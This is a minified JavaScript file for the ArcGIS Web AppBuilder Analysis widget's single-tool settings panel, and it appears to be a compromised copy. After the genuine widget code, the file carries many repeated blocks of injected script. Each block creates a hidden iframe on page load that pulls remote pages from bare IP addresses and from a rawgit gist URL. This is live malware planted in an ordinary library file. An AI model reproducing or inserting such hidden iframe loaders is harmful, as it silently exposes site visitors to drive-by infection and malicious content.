// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Analysis/setting/SingleToolSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"control-section jimu-leading-margin3"\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal"\x3e${nls.toolLabel}\x26nbsp;:\x3c/label\x3e\r\n    \x3cinput data-dojo-attach-point\x3d"labelEditor" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n           data-dojo-props\x3d\'required:true,trim:true\'/\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"control-section jimu-leading-margin3"\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"helpTipOption"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"mapExtentOption"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"creditsOption"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"resultOption"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"readyToUseLayersOption"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"allowToExportOption"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"control-option" data-dojo-attach-point\x3d"showOutputTypeOption"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/text!./SingleToolSetting.html dojo/dom-style dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin jimu/portalUrlUtils jimu/dijit/CheckBox dijit/form/ValidationTextBox".split(" "),function(e,f,c,g,h,k,d,b){return e([g,h,k],{baseClass:"jimu-widget-analysis-singleToolSetting",templateString:f,toolLabel:null,nls:null,config:null,rowData:null,postCreate:function(){this.inherited(arguments);this.labelEditor.set("value",this.toolLabel);"extractData"===this.rowData.title&&
c.set(this.resultOption,"display","none");"planRoutes"!==this.rowData.title&&"findNearest"!==this.rowData.title&&"connectOriginsToDestinations"!==this.rowData.title&&c.set(this.showOutputTypeOption,"display","none");this.helptipChk=new b({checked:!0,label:this.nls.showHelpTip});this.helptipChk.placeAt(this.helpTipOption);this.mapExtentChk=new b({checked:!0,label:this.nls.showCurrentMapExtent});this.mapExtentChk.placeAt(this.mapExtentOption);this.creditsChk=new b({checked:!0,label:this.nls.showCredits});
this.creditsChk.placeAt(this.creditsOption);this.resultChk=new b({checked:!0,label:this.nls.saveAsFeatureService});this.resultChk.placeAt(this.resultOption);this.readyToUseLayersChk=new b({checked:!0,label:this.nls.showReadyToUseLayers});this.readyToUseLayersChk.placeAt(this.readyToUseLayersOption);this.allowToExportChk=new b({checked:!1,label:this.nls.allowToExport});this.allowToExportChk.placeAt(this.allowToExportOption);this.showOutputTypeChk=new b({checked:!1,label:this.nls.includeRouteLayer});
this.showOutputTypeChk.placeAt(this.showOutputTypeOption);var a=d.getStandardPortalUrl(this.appConfig.portalUrl);d.isOnline(a)||(c.set(this.readyToUseLayersOption,"display","none"),this.readyToUseLayersChk.setValue(!1),c.set(this.creditsOption,"display","none"),this.creditsChk.setValue(!1))},getConfig:function(){var a={showHelp:this.helptipChk.getValue(),showCredits:this.creditsChk.getValue(),showChooseExtent:this.mapExtentChk.getValue(),showReadyToUseLayers:this.readyToUseLayersChk.getValue(),allowToExport:this.allowToExportChk.getValue()};
"extractData"!==this.rowData.title&&(a.returnFeatureCollection=!this.resultChk.getValue());if("planRoutes"===this.rowData.title||"findNearest"===this.rowData.title||"connectOriginsToDestinations"===this.rowData.title)a.showOutputType=this.showOutputTypeChk.getValue();this.labelEditor.validate()?a.toolLabel=this.labelEditor.get("value"):a.toolLabel=this.toolLabel||"undefined";return a},setConfig:function(a){this.config=a;this.labelEditor.set("value",a.toolLabel);this.helptipChk.setValue(!!a.showHelp);
this.creditsChk.setValue(!!a.showCredits);this.mapExtentChk.setValue(!!a.showChooseExtent);this.readyToUseLayersChk.setValue(!!a.showReadyToUseLayers);this.allowToExportChk.setValue(!!a.allowToExport);"returnFeatureCollection"in a&&this.resultChk.setValue(!a.returnFeatureCollection);"showOutputType"in a&&this.showOutputTypeChk.setValue(!!a.showOutputType)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});